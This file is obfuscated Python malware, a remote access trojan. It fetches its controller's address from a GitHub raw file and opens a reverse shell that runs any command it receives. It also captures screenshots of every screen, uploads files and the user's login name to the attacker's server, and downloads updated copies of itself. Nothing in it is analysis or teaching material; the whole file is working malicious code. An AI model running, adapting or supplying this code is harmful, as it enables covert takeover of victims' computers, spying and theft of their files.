import subprocess,socket,time,requests,os
from PIL import ImageGrab
kWkjlfbMa = "05.12.24.2"
lHncLVufDKnFJUawHTZvuWg = ""
uwibJydgqFmufxpOup = ""
dcYotTYyirbi = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
KgrWmhRJpQRnjkEr = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
LoJhPDmLnRIcps = "!"
def vAQgdvPWHtyABE(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def XNbIFRYuTughAmaeXr(s):
	fhcChTJK = s.recv(1024)
	if len(fhcChTJK)==0:
		return True
	yTFdPUIlYoGSAKHnqcaUo = fhcChTJK.decode("utf-8").replace("\n","")
	if not yTFdPUIlYoGSAKHnqcaUo.startswith(LoJhPDmLnRIcps):
		proc = subprocess.run(yTFdPUIlYoGSAKHnqcaUo, shell=True, capture_output=True)
		xPHGQDO = proc.stdout + proc.stderr
		s.send(xPHGQDO)
		return
	sXWNKQMDeDZxaKarvZmOXbf = yTFdPUIlYoGSAKHnqcaUo.split(" ")[0][1:]
	if sXWNKQMDeDZxaKarvZmOXbf == "download":
		pntcgftUtALXTGzXKW(s, yTFdPUIlYoGSAKHnqcaUo)
	elif sXWNKQMDeDZxaKarvZmOXbf == "screenshot":
		MhPAsVNEviFWH(s)
	elif sXWNKQMDeDZxaKarvZmOXbf == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
def pntcgftUtALXTGzXKW(s, yTFdPUIlYoGSAKHnqcaUo):
	JSPiVmdea = yTFdPUIlYoGSAKHnqcaUo.replace(LoJhPDmLnRIcps+"download ","").split(",")
	xPHGQDOs = ""
	for f in JSPiVmdea:
		xPHGQDOs += IONMeltnSqMnyOCMqnQ(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(xPHGQDOs, "utf-8"))
def MhPAsVNEviFWH(s):
	zHzKkwso = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	KoHiuRHMGYKJDYhUyaVlOlO = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	zHzKkwso.save(KoHiuRHMGYKJDYhUyaVlOlO)
	zHzKkwso.close()
	r = IONMeltnSqMnyOCMqnQ(KoHiuRHMGYKJDYhUyaVlOlO, "api/sscap")
	os.remove(KoHiuRHMGYKJDYhUyaVlOlO)
	s.send(bytes(r,"utf-8"))
def IONMeltnSqMnyOCMqnQ(SwTMrJJStJBh, VUvtchhLsgw, zDOTiRWsGiFHnfLcNLhXXVh=None):
	if not os.path.exists(SwTMrJJStJBh):
		return "[!] NOT FOUND: "+SwTMrJJStJBh+"\n"
	headers = {"user":os.getlogin()}
	if zDOTiRWsGiFHnfLcNLhXXVh is not None:
		headers = {**headers, **zDOTiRWsGiFHnfLcNLhXXVh}
	requests.post("http://"+lHncLVufDKnFJUawHTZvuWg+":5555/"+VUvtchhLsgw,
		files={"file":open(SwTMrJJStJBh, "rb")},
		headers=headers)
	return "[+] SUCCESS: "+SwTMrJJStJBh+"\n"
def tIuoZIEJELesAsDteanq():
	global lHncLVufDKnFJUawHTZvuWg, uwibJydgqFmufxpOup
	if lHncLVufDKnFJUawHTZvuWg == "" or uwibJydgqFmufxpOup == "":
		fhcChTJK = requests.get(dcYotTYyirbi).text.replace("\n","").split(":")
		lHncLVufDKnFJUawHTZvuWg = fhcChTJK[0].strip()
		uwibJydgqFmufxpOup = fhcChTJK[1].strip()
		ctwYoiDZAvnTHFetqgMAbt = fhcChTJK[2].strip()
	return lHncLVufDKnFJUawHTZvuWg, uwibJydgqFmufxpOup, ctwYoiDZAvnTHFetqgMAbt
def OKLhrAEqncVnDyZSQCJwhhF():
	ctcWfORHHXAE = os.path.basename(__file__)
	fileType = ctcWfORHHXAE.split(".")[-1]
	VWOsyPjilLnS = ctcWfORHHXAE.replace("."+fileType,"") +"."+kWkjlfbMa + "."+fileType
	gVuXsiZQvREktzdMBGdA = os.path.join(os.getcwd(), VWOsyPjilLnS)
	with open(VWOsyPjilLnS, "w+") as f:
		f.write(requests.get(KgrWmhRJpQRnjkEr+"file."+gVuXsiZQvREktzdMBGdA.split(".")[-1]).text)
	#if fileType == "exe":
	#	os.system(".\"+gVuXsiZQvREktzdMBGdA")
	#elif fileType.startswith("py"):
	#	os.system("python "+gVuXsiZQvREktzdMBGdA)
def tgyvYruwHWFuCC():
	pass
def ZlkplxC():
	h, p, v = tIuoZIEJELesAsDteanq()
	if kWkjlfbMa != v:
		OKLhrAEqncVnDyZSQCJwhhF()
	tgyvYruwHWFuCC()
	YBrUGnUBar = bytes("["+kWkjlfbMa+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				zOCmnKlKZtnlfJzz=False
				try:
					s=vAQgdvPWHtyABE(h, p)
					while not zOCmnKlKZtnlfJzz:
						s.send(YBrUGnUBar)
						zOCmnKlKZtnlfJzz=XNbIFRYuTughAmaeXr(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
ZlkplxC()
